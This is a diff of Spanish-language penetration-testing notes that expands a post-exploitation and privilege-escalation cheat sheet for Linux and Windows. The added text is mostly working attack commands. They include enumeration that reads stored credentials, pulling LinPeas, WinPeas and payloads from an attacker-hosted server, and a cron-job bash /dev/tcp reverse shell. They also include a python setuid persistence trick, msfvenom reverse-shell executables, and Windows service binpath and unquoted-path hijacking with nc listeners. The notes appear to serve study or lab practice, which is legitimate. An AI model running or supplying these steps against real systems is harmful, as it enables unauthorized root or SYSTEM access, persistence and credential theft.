@@ -581,21 +581,42 @@ POSTEXPLOTACION
       MANUAL
       ......
 
-         whoami              => averiguar usuario que soy
-         hostname            => averiguar nombre del host
-         uname - a           => saber la version del kernel
-         cat /proc/version   => ver la version del kernel
-         cat /etc/passwd     => ver los usuarios
-         ifconfig            => ver ip y tarjetas de red por si hay otra red y pivotar
-         sudo -l             => muestra los comando que se pueden usar con sudo
-         netstat             => servicios que corren
-         ps -ef              => procesos que corren
-         env                 => variables de entorno
-         id                  => ver el id de usuario
-         cat /etc/crontab    => almacen de tareas programadas
-   
-         find / perm -u=s -type f 2>/dev/null    =>
-         getcap -r / 2>/dev/null                 =>
+            LINUX
+            .....
+      
+               whoami              => averiguar usuario que soy
+               hostname            => averiguar nombre del host
+               uname - a           => saber la version del kernel
+               cat /proc/version   => ver la version del kernel
+               cat /etc/passwd     => ver los usuarios
+               ifconfig            => ver ip y tarjetas de red por si hay otra red y pivotar
+               sudo -l             => muestra los comando que se pueden usar con sudo
+               netstat             => servicios que corren
+               ps -ef              => procesos que corren
+               env                 => variables de entorno
+               id                  => ver el id de usuario
+               cat /etc/crontab    => almacen de tareas programadas
+         
+               find / perm -u=s -type f 2>/dev/null    => Busca comandos vulnerables para añadir permisos
+               getcap -r / 2>/dev/null                 => 
+
+            WINDDOWS
+            ........
+                  
+               hostname                            => nombre del host
+               whoami                              => nombre del usuario
+               whoami /priv                        => igual que sudo -l ver que permisos tenemos en la maquina
+               syteminfo                           => ver que parches tiene la maquina windows, ver el kernel
+               ipconfig                            => ver la ip y tarjetas de red
+               cmdkey /list                        => ver las credenciales guardadas
+               icacls <ruta>                       => ver permisos que tenemos en esa ruta
+               sc query windefend                  => 
+               sc queryex type=service             =>
+               netsh advfirewall firewall dump     => dumpear si tiene antivirus o firewall
+               schtasks /query /fo LIST /v         => ver las tareas programadas
+               reg /query                          => 
+               Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections =>
+
 
       AUTOMATICO
       ..........
@@ -604,55 +625,147 @@ POSTEXPLOTACION
          WinPeas => Automatiza la enumeracion en Windows
          MacPeas => en deshuso, ahora se usa LinPeas
 
-         Para usarlo:
+         Para usarlo en linux:
             1 - Creamos servidor en maquina atacante en la carpeta de LinPeas /usr/share/peass/linpeas
-               python3 -m http.server 8080
+                  python3 -m http.server 8080
             2 - Normalmente en target nos vamos a cd /tmp para descargar LinPeas
-               wget http://<IP ATACANTE>:8080/linpeas.sh
+                  wget http://<IP ATACANTE>:8080/linpeas.sh => en linux               
             3 - Damos permiso ejecucion
-               chmod +x linpeas.sh
+                  chmod +x linpeas.sh
             4 - Ejecutamos
-               ./linpeas.sh
+                  ./linpeas.sh
+
+         Para usarlo en windows:
+
+            1 - Creamos servidor en maquina atacante
+                  python3 -m http.server 8080
+            2 - Buscamos una carpeta que podamos escribir y descargamos WinPeas
+                  curl -O http://IP ATACANTE:8080/winPEASany_ofs.exe
+            3 - Ejecutamos el .exe
+                  /winPEASany_ofs.exe
+      
 
    ESCALAR PRIVILEGIOS
    ...................
 
-      OPCION SENCILLA
-      ...............
+      LINUX
+      .....
 
-         Ej Vulnerabilidad Kernel
-            1 - Buscamos exploit en google o searchsploit
-            2 - Copiamos exploit => searchsploit -m PATH o creamos archivo y copiamos codigo
-            3 - Subimos exploit a target => Igual que LinPeas.sh creando servidor
-            4 - Ejecutamos exploit => ./exploit
+            OPCION SENCILLA
+            ...............
+         
+                  Ej Vulnerabilidad Kernel
+                     1 - Buscamos exploit en google o searchsploit
+                     2 - Copiamos exploit => searchsploit -m PATH o creamos archivo y copiamos codigo
+                     3 - Subimos exploit a target => Igual que LinPeas.sh creando servidor
+                     4 - Ejecutamos exploit => ./exploit
+         
+                  Compilar => gcc 37292.c -o exploit
+      
+            TECNICA SUDO
+            ............
+      
+                  1 - sudo -l => Para ver que comandos son vulnerables
+                  2 - visitar => gtfobins.github.io
+                  3 - Filtro por sudo y busco comando vulnerable ej: find
+                  4 - Copiamos el comando y lo ejecutamos
+                  5 - Escalamos a root
+      
+            TECNICA SUID
+            ............
+      
+                  Añadimos permisos SUID a un comando
+                  1 - Buscamos Comandos Vulnerables
+                        find / -perm -u=s -type f 2>/dev/null
+                  2 - visitar => gtfobins.github.io
+                  3 - Filtramos por SUID
+                  4 - Buscamos el comando vulnerable
+                  5 - Ejecutamos el codigo que nos da
+      
+                  Dar permisos SUID 
+                     chmod 4755 /usr/bin/find
+      
+                  IMPORTANTE:  Adquirimos permisos del propietario del archivo puede ser root u otro usuario
 
-         Compilar => gcc 37292.c -o exploit
+            TECNICA CRON JOBS
+            .................
 
-      TECNICA SUDO
-      ............
+                  Es una vulnerabilidad de las tareas programadas con root
+                     1 - Vemos las tareas programadas 
+                           cat /etc/crontab
+                     2 - Buscamos en los archivos programados que tengamos permisos para modificarlos
+                     3 - Modificamos el archivo y escribimos una reverse shell para que lo ejecute cuando toque la tarea
+                           bash -i >& /dev/tcp/IP ATACANTE/PUERTO 0>&1
+                     4 - Poner en escucha nuestra maquina atacante y esperar que la tarea se ejecute automaticamente
+                           nc -lnvp PUERTO
+                     5 - Nos devuelve una reverse shell en root
 
-            1 - sudo -l => Para ver que comandos son vulnerables
-            2 - visitar => gtfobins.github.io
-            3 - Filtro por sudo y busco comando vulnerable ej: find
-            4 - Copiamos el comando y lo ejecutamos
-            5 - Escalamos a root
+            CAPABILITIES (Persistencia)
+            ..........................
 
-      TECNICA SUID
-      ............
+                  No es una escalada de privilegios, es una manera de persistencia para convertirte en root. Para poder ponerla capabilitie tienes que ser root previamente. 
+                     1 - Buscamos Capabilities en gtfobins => python o php son las mas comunes
+                     2 - Usamos los comandos que nos da gtfobins => como ROOT 
+                           sudo setcap cap_setuid+ep python
+                              * SI NO FUNCIONA: readlink -f /usr/bin/python3
+                                                setcap cap_setuid+ep /usr/bin/python3.8
+                     3 - Para usar la capabiliti estando como USER ejecutamos el segundo comando de gtfobins
+                           ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+                     4 - Escalamos y somos ROOT
 
-            Añadimos permisos SUID a un comando
-            1 - Buscamos Comandos Vulnerables
-                  find / -perm -u=s -type f 2>/dev/null
-            2 - visitar => gtfobins.github.io
-            3 - Filtramos por SUID
-            4 - Buscamos el comando vulnerable
-            5 - Ejecutamos el codigo que nos da
+      WINDOWS
+      .......
 
-            Dar permisos SUID 
-               chmod 4755 /usr/bin/find
+            SERVICE EXPLOIT : INSECURE SERVICE PERMISSIONS
+            ..............................................
 
-            IMPORTANTE:  Adquirimos permisos del propietario del archivo puede ser root u otro usuario
-  
+                  Debemos tener instalado las herramientas Sysinternals para poder usar accesschk.exe y comprobar si es vulnerable => WinPeas Tambien detecta la vulnerabilidad
+                 
+                  Esta vulnerabilidad consiste en que puedes modificar la configuracion de un servicio. 
+
+                     1 - Comprobamos que permisos tenemos en la carpeta
+                           C:\...\accesschk.exe /accepteula -uwdq "C:\Program Files\...\" 
+                     2 - Buscamos informacion del servicio
+                           sc qc SERVICIO 
+                     3 - Creamos una reverse shell con msfvenom
+                           msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse.exe
+                     4 - Subimos el archivo a nuestro target => normalmente a la carpeta user que es la que tenemos permisos
+                           python -m http.server 8080
+                           curl -O http://IP Atacante:8080/reverse.exe
+                     5 - Cambiamos la ruta de ejecucion del servicio para que se ejecute nuestra reverse shell
+                           sc config daclsvc binpath= "\"C:\Users\user\reverse.exe\""
+                     6 - Ponemos en escucha nuestra maquina atacante
+                           nc -lvnp 4444
+                     7 - Ejecutamos el servicio en maquina windows
+                           net start SERVICIO
+                     8 - nos devuelve una reverse shell como system
+
+            SERVICE EXPLOIT : UNQUOTED SERVICE PATH
+            .......................................
+      
+                  Vulnerabilidad causada por no poner comillas a la ruta de la carpeta del servicio. Consiste en que podemos crear una reverse shell con una palabra de la ruta y ejecutara el .exe
+                           Ej: Si la ruta es C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe => Podriamos colar una reverse shell llamada Common.exe
+                    
+                     Pasos del 1 al 4 igual que INSECURE SERVICE PERMISSIONS 
+                     5 - Debemos crear la reverse shell con el nombre que necesitamos o la renombramos
+                           ren reverse.exe Common.exe => Esto cambia el nombre o directamente con copy en el paso 6
+                     6 - Ponemos nuestra reverse shell en la ruta del servicio para que se ejecute
+                           copy C:\User\user\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+                     7 - Ponemos en escucha nuestra maquina atacante
+                           nc -lvnp 4444
+                     8 - Ejecutamos el servicio en maquina windows
+                           net start SERVICIO
+                     9 - nos devuelve una reverse shell como system 
+
+            SERVICE EXPLOIT : INSECURE SERVICE EXECUTABLES
+            ..............................................
+
+                  Vulnerabilidad causada por tener permiso para ejecutar y modificar el archivo todos los usuarios del sistema. 
+
+                     Todos los pasos son igual que UNQUOTED SERVICE PATH solo que debemos ponerle el mismo nombre a nuestra reverse shell que el servicio para sustituirlo y que se ejecute nuestro archivo
+                        Ej: Si el sercicio se llama filepermservice.exe copiariamos en la ruta nuestra reverse shell asi: 
+                           copy C:\User\user\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" 
+                               
 ANONIMATO/TOR
 .............
 
